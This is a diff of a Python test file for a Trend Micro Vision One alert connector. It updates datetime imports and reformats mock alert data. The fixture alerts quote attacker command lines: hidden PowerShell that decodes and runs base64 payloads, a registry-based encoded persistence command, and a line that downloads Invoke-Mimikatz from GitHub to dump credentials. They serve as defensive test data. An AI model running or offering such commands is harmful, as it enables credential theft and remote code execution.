@@ -1,4 +1,4 @@
-from datetime import datetime, timedelta, timezone
+from datetime import UTC, datetime, timedelta
 from unittest.mock import Mock, patch
 
 import pytest
@@ -149,7 +149,9 @@ def message_1():
                         "id": 1,
                         "type": "command_line",
                         "field": "processCmd",
-                        "value": "c:\\windows\\system32\\rundll32.exe c:\\users\\sam\\appdata\\local\\cyzfc.dat entrypoint",
+                        "value": (
+                            "c:\\windows\\system32\\rundll32.exe c:\\users\\sam\\appdata\\local\\cyzfc.dat entrypoint"
+                        ),
                         "relatedEntities": ["35FA11DA-A24E-40CF-8B56-BAF8828CC15E"],
                         "filterIds": ["ac200e74-8309-463e-ad6b-a4c16a3a377f"],
                         "provenance": ["Alert"],
@@ -158,7 +160,11 @@ def message_1():
                         "id": 2,
                         "type": "command_line",
                         "field": "parentCmd",
-                        "value": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -noni -win hidden -Ep ByPass $r = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('....XggJHNjQjs=')); iex $r;  ",
+                        "value": (
+                            'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" -noni -win hidden '
+                            "-Ep ByPass $r = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String("
+                            "'....XggJHNjQjs=')); iex $r;  "
+                        ),
                         "relatedEntities": ["35FA11DA-A24E-40CF-8B56-BAF8828CC15E"],
                         "filterIds": ["ac200e74-8309-463e-ad6b-a4c16a3a377f"],
                         "provenance": ["Alert"],
@@ -167,7 +173,9 @@ def message_1():
                         "id": 3,
                         "type": "command_line",
                         "field": "processCmd",
-                        "value": "c:\\windows\\system32\\rundll32.exe c:\\users\\sam\\appdata\\local\\cyzfc.dat entrypoint",
+                        "value": (
+                            "c:\\windows\\system32\\rundll32.exe c:\\users\\sam\\appdata\\local\\cyzfc.dat entrypoint"
+                        ),
                         "relatedEntities": ["35FA11DA-A24E-40CF-8B56-BAF8828CC15E"],
                         "filterIds": ["857b6396-da29-44a8-bc11-25298e646795"],
                         "provenance": ["Alert"],
@@ -176,7 +184,11 @@ def message_1():
                         "id": 4,
                         "type": "command_line",
                         "field": "parentCmd",
-                        "value": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -noni -win hidden -Ep ByPass $r = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('....jY0KTtpZXggJHNjQjs=')); iex $r;  ",
+                        "value": (
+                            'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" -noni -win hidden '
+                            "-Ep ByPass $r = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String("
+                            "'....jY0KTtpZXggJHNjQjs=')); iex $r;  "
+                        ),
                         "relatedEntities": ["35FA11DA-A24E-40CF-8B56-BAF8828CC15E"],
                         "filterIds": ["857b6396-da29-44a8-bc11-25298e646795"],
                         "provenance": ["Alert"],
@@ -212,7 +224,11 @@ def message_1():
                         "id": 8,
                         "type": "registry_value_data",
                         "field": "objectRegistryData",
-                        "value": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -NonI -W Hidden -c $x=$((gp HKCU:Software\\Microsoft\\Windows Update).Update); powershell -NoP -NonI -W Hidden -enc $x",
+                        "value": (
+                            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -NonI -W Hidden "
+                            "-c $x=$((gp HKCU:Software\\Microsoft\\Windows Update).Update); "
+                            "powershell -NoP -NonI -W Hidden -enc $x"
+                        ),
                         "relatedEntities": ["35FA11DA-A24E-40CF-8B56-BAF8828CC15E"],
                         "filterIds": ["ac200e74-8309-463e-ad6b-a4c16a3a377f"],
                         "provenance": ["Alert"],
@@ -267,7 +283,9 @@ def message_1():
                         },
                     ],
                 },
-                "description": "A user obtained account logon information that can be used to access remote systems via Mimikatz.",
+                "description": (
+                    "A user obtained account logon information that can be used to access remote systems via Mimikatz."
+                ),
                 "matchedRules": [
                     {
                         "id": "1288958d-3062-4a75-91fc-51b2a49bc7d7",
@@ -294,7 +312,12 @@ def message_1():
                         "id": 1,
                         "type": "command_line",
                         "field": "objectCmd",
-                        "value": 'c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe "iex (new-object net.webclient).downloadstring(" "https://raw.githubusercontent.com/mattifestation/powersploit/master/exfiltration/invoke-mimikatz.ps1); invoke-mimikatz -dumpcreds"',
+                        "value": (
+                            'c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe "iex '
+                            '(new-object net.webclient).downloadstring(" "https://raw.githubusercontent.com/'
+                            "mattifestation/powersploit/master/exfiltration/invoke-mimikatz.ps1); "
+                            'invoke-mimikatz -dumpcreds"'
+                        ),
                         "relatedEntities": ["35FA11DA-A24E-40CF-8B56-BAF8828CC15E"],
                         "filterIds": ["49d327c4-361f-43f0-b66c-cab433495e42"],
                         "provenance": ["Alert"],
@@ -303,7 +326,10 @@ def message_1():
                         "id": 2,
                         "type": "command_line",
                         "field": "processCmd",
-                        "value": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe -nop -noni -w hidden -enc ......aakaakaekavgaracqaswapackafabjaeuawaa=",
+                        "value": (
+                            "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe "
+                            "-nop -noni -w hidden -enc ......aakaakaekavgaracqaswapackafabjaeuawaa="
+                        ),
                         "relatedEntities": ["35FA11DA-A24E-40CF-8B56-BAF8828CC15E"],
                         "filterIds": ["49d327c4-361f-43f0-b66c-cab433495e42"],
                         "provenance": ["Alert"],
@@ -312,7 +338,11 @@ def message_1():
                         "id": 3,
                         "type": "command_line",
                         "field": "parentCmd",
-                        "value": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe -nop -noni -w hidden -c $x=$((gp hkcu:software\\microsoft\\windows update).update); powershell -nop -noni -w hidden -enc $x",
+                        "value": (
+                            "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe -nop -noni -w hidden "
+                            "-c $x=$((gp hkcu:software\\microsoft\\windows update).update); "
+                            "powershell -nop -noni -w hidden -enc $x"
+                        ),
                         "relatedEntities": ["35FA11DA-A24E-40CF-8B56-BAF8828CC15E"],
                         "filterIds": ["49d327c4-361f-43f0-b66c-cab433495e42"],
                         "provenance": ["Alert"],
@@ -367,7 +397,7 @@ def message_1():
     ],
 )
 def test_next_batch_sleep_behavior(trigger, message_1, batch_duration, expected_sleep_calls, mocked_vision_one_time):
-    trigger.cursor.offset = datetime(year=2024, month=11, day=1, tzinfo=timezone.utc)
+    trigger.cursor.offset = datetime(year=2024, month=11, day=1, tzinfo=UTC)
     with requests_mock.Mocker() as mock_requests:
         mock_time = mocked_vision_one_time
         mock_requests.register_uri("GET", "https://api.xdr.trendmicro.com/v3.0/workbench/alerts", json=message_1)
@@ -383,7 +413,7 @@ def test_next_batch_sleep_behavior(trigger, message_1, batch_duration, expected_
 
 
 def test_fetch_events_should_reset_future_checkpoint(trigger):
-    future_date = datetime.now(timezone.utc) + timedelta(days=1)
+    future_date = datetime.now(UTC) + timedelta(days=1)
     trigger.from_date = future_date
     trigger.cursor.offset = future_date
 
@@ -394,7 +424,7 @@ def test_fetch_events_should_reset_future_checkpoint(trigger):
 
     assert fetch_mock.call_count == 1
     fetched_from_date = fetch_mock.call_args.args[0]
-    assert fetched_from_date <= datetime.now(timezone.utc)
+    assert fetched_from_date <= datetime.now(UTC)
     assert trigger.from_date == fetched_from_date
     assert trigger.cursor.offset == fetched_from_date
     trigger.log.assert_any_call(
@@ -408,7 +438,7 @@ def test_fetch_events_should_reset_future_checkpoint(trigger):
 
 
 def test_fetch_events_retries_future_checkpoint_recovery_after_persistence_error(trigger):
-    future_date = datetime.now(timezone.utc) + timedelta(days=1)
+    future_date = datetime.now(UTC) + timedelta(days=1)
     trigger.from_date = future_date
     trigger.cursor.offset = future_date
 
@@ -431,12 +461,12 @@ def test_fetch_events_retries_future_checkpoint_recovery_after_persistence_error
     assert reset_mock.call_count == 2
     assert fetch_mock.call_count == 1
     recovered_from_date = fetch_mock.call_args.args[0]
-    assert recovered_from_date <= datetime.now(timezone.utc)
+    assert recovered_from_date <= datetime.now(UTC)
     assert trigger.from_date == recovered_from_date
 
 
 def test_fetch_events_updates_checkpoint_when_newer_events_are_seen(trigger):
-    trigger.from_date = datetime(2024, 11, 1, tzinfo=timezone.utc)
+    trigger.from_date = datetime(2024, 11, 1, tzinfo=UTC)
     trigger.cursor.offset = trigger.from_date
     next_events = [{"createdDateTime": "2024-11-01T00:00:30Z"}]
     fetch_mock = Mock(return_value=iter([next_events]))
@@ -445,12 +475,12 @@ def test_fetch_events_updates_checkpoint_when_newer_events_are_seen(trigger):
     batches = list(trigger.fetch_events())
 
     assert batches == [next_events]
-    assert trigger.from_date == datetime(2024, 11, 1, 0, 0, 31, tzinfo=timezone.utc)
+    assert trigger.from_date == datetime(2024, 11, 1, 0, 0, 31, tzinfo=UTC)
     assert trigger.cursor.offset == trigger.from_date
 
 
 def test_fetch_events_skips_empty_batches(trigger):
-    initial_from_date = datetime(2024, 11, 1, tzinfo=timezone.utc)
+    initial_from_date = datetime(2024, 11, 1, tzinfo=UTC)
     trigger.from_date = initial_from_date
     trigger.cursor.offset = initial_from_date
     fetch_mock = Mock(return_value=iter([[]]))
